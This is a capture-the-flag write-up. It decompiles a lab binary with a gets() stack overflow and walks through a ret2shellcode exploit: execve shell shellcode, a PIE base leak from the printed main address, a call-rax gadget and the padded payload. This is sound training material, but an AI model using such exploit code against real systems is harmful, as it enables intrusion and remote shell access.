### Challenge Description
![image](https://github.com/user-attachments/assets/adf44968-93f0-4f5b-840e-ef0625f72ad4)
---
Decompile downloaded file: 
Main: 
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("\n  (\\_/)");
  puts(asc_200D);
  printf("  / > %p\n\n", main);
  puts("follow the white rabbit...");
  follow();
  return 0;
}
```
The program gives us ``` main ``` address. We might use it.
Follow: 
```
void __cdecl follow()
{
  char buf[100]; // [rsp+0h] [rbp-70h] BYREF

  gets(buf);
}
```
There is a buffer overflow here. We'll exploit it using **ret2shellcode**. First, let's create our shellcode:
```
shellcode = asm(
    '''
    mov rax, 0x3b             # sys_execve syscall number
    mov rdi, 29400045130965551 
    push rdi                   
    mov rdi, rsp               
    xor rsi, rsi              
    xor rdx, rdx              
    syscall                    
    ''', arch='amd64')
```
Because NX is disabled, we'll put the shellcode onto the stack and try to execute them. One way to do this is using gadget ``` call_rax ``` or ``` jmp_rax ```.
However, PIE is enabled here, so we have to leak the code base and add to the offset of gadget to obtain the real address of it. 

```
main_func = int(r.recvline().strip(), 16)
lb = main_func - exe.sym['main']

call_rax = lb + 0x0000000000001014  # this is call_rax offset, using ROPgadget tool
```

I set a breakpoint after the gets function and this is stack layout:
![image](https://github.com/user-attachments/assets/7d1109ba-29f2-42e6-9dc7-a4229bf8ca30)
To overflow the ``` buf ```, our payload includes the shellcode and the rest to make up 0x78 bytes, final 8 bytes is ``` call rax ``` address. 
```
payload = shellcode
payload = payload.ljust(0x78, b'a') + p64(call_rax)

r.send(payload)
```
Connect to the server, we'll get the flag.


